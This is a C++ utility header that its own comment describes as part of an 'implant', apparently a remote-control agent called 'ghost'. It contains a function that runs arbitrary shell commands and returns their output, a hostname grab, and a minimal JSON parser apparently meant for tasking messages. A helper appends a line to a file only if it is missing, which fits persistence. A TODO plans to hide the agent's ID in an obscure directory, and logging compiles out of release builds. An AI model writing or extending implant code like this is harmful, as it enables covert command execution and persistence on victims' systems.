#ifndef UTILS_HPP
#define UTILS_HPP

#include <string>
#include <array>
#include <vector>
#include <cstdio>
#include <memory>
#include <algorithm>
#include <unistd.h>
#include <fstream>
#include <filesystem>

#define POPEN popen
#define PCLOSE pclose

// log macro setup
#ifdef DEBUG
    #include <iostream>

    #define LOG_SUCCESS(...)    std::cout << "[+] " << std::format(__VA_ARGS__) << '\n';
    #define LOG_ERROR(...)      std::cout << "[-] " << std::format(__VA_ARGS__) << '\n';
    #define LOG_INFO(...)       std::cout << "[*] " << std::format(__VA_ARGS__) << '\n';
    #define LOG_ALERT(...)      std::cout << "[!] " << std::format(__VA_ARGS__) << '\n';
#else
    #define LOG_SUCCESS(...)
    #define LOG_ERROR(...)
    #define LOG_INFO(...)
    #define LOG_ALERT(...)
#endif

namespace Utils {
    // === SYSTEM UTILS ===
    std::string executeCommand(const std::string& command) {
        std::array<char, 128> buffer;
        std::string result;
        std::string fullCommand = command + " 2>&1";    // i've read it's generally good practice to redirect stderr in these kinds of implants

        FILE* pipe = POPEN(fullCommand.c_str(), "r");
        if (!pipe) {
            return "ERROR opening pipe";
        }

        while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
            result += buffer.data();
        }

        PCLOSE(pipe);

        return result;
    }

    std::string getHostname() {
        char hostname[1024];

        if (gethostname(hostname, 1024) == 0) {
            return std::string(hostname);
        }

        return "unknown";
    }

    // TODO: code from https://antonz.org/uuidv7/#cpp by Anton Zhiyanov
    // TODO: modified to return string instead
    // SOLUTION: put the UUID as a file in some obscure user-writeable directory
    // SOLUTION: and check whether or not it's present before generating a new one
    std::string generateUuid() {
        return "test-ghost-1";
    }

    // === JSON UTILS ===
    std::string jsonEscape(const std::string& json) {
        std::string output;

        for (char c : json) {
            switch (c) {
                case '"': output += "\\\""; break;
                case '\\': output += "\\\\"; break;
                case '\b': output += "\\b"; break;
                case '\f': output += "\\f"; break;
                case '\n': output += "\\n"; break;
                case '\r': output += "\\r"; break;
                case '\t': output += "\\t"; break;
                default: 
                    if (c < 32) {
                        char buf[7];
                        snprintf(buf, sizeof(buf), "\\u%04x", c);
                        output += buf;
                    } else {
                        output += c;
                    }
                    break;
            }
        }

        return output;
    }

    std::string getJsonValue(const std::string& json, const std::string& key) {
        std::string search = "\"" + key + "\":";
        size_t startPos = json.find(search);
        
        if (startPos == std::string::npos) return "";

        startPos += search.length();
        while (startPos < json.length() &&
                (json[startPos] == ' ' || json[startPos] == '\n' || json[startPos] == '\r')) {
            startPos++;
        }

        if (startPos >= json.length()) return "";

        if (json[startPos] == '"') {    // string
            size_t startQuote = startPos;
            size_t endQuote = json.find("\"", startQuote + 1);

            while (endQuote < json.length()) {
                if (json[endQuote] == '"' && json[endQuote - 1] != '\\') {
                    break;
                }

                endQuote++;
            }

            if (endQuote >= json.length()) {
                return "";
            }

            return json.substr(startQuote + 1, endQuote - startQuote - 1);
        } else {    // num or bool
            size_t endPos = json.find_first_of(",}", startPos);

            if (endPos == std::string::npos) {
                return "";
            }

            return json.substr(startPos, endPos - startPos);
        }
    }

    std::string getJsonArrayRaw(const std::string& json, const std::string& key) {
        std::string search = "\"" + key + "\":";
        size_t startPos = json.find(search);

        if (startPos == std::string::npos) {
            return "";
        }

        startPos += search.length();
        while (startPos < json.length() && json[startPos] == '[') {
            startPos++;
        }

        if (startPos >= json.length()) {
            return "";
        }

        int bracketCount = 1;
        size_t endPos = startPos;

        do {
            if (json[endPos] == '[') {
                bracketCount++;
            } else if (json[endPos] == ']') {
                bracketCount--;
            }

            endPos++;
        } while (bracketCount > 0 && endPos < json.length());

        return json.substr(startPos, endPos - startPos - 1);
    }

    std::vector<std::string> splitJsonObjects(std::string jsonArray) {
        std::vector<std::string> objects;
        if (jsonArray.length() < 2) {
            return objects;
        }
        
        jsonArray = jsonArray.substr(1, jsonArray.length() - 2);
        if (jsonArray.empty()) {
            return objects;
        }

        std::string delimiter = "},{";
        size_t pos = 0;
        while ((pos = jsonArray.find(delimiter)) != std::string::npos) {
            std::string token = jsonArray.substr(0, pos + 1);
            if (token[0] != '{') {
                token = "{" + token;
            }

            objects.push_back(token);
            jsonArray.erase(0, pos + 2);

            if (!jsonArray.empty() && jsonArray[0] != '{') {
                jsonArray = "{" + jsonArray;
            }
        }

        objects.push_back(jsonArray);

        return objects;
    }

    // === FILE UTILS ===
    bool appendToFile(const std::string& filepath, const std::string& lineToAppend) {
        std::fstream file(filepath, std::ios::in | std::ios::out);

        if (file.is_open()) {
            std::string line;

            while (std::getline(file, line)) {
                if (line.find(lineToAppend) != std::string::npos) {
                    return true;
                }
            }

            file.clear();
            
            file << "\n" << lineToAppend << "\n";
            file.close();

            return true;
        }

        return false;
    }
}

#endif